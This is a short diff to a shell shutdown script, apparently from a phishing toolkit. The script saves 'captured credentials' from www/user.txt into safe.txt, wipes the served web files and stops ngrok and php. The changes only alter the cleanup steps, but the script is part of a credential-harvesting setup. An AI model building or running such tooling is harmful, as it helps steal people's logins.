@@ -2,7 +2,6 @@
 echo "\n\n"Closing...
 echo Saving captured credentials data to safe.txt...
 f=www/user.txt
-chmod 766 safe.txt
 if test -f "$f"
 then
 	cat $f >> safe.txt
@@ -13,7 +12,5 @@ fi
 echo Shutting down server...
 rm -rf www/*
 killall -q ngrok
-service apache2 stop
-umount -q /var/www/html
-chmod 755 shell/* safe.txt
+killall -q php
 echo Done.
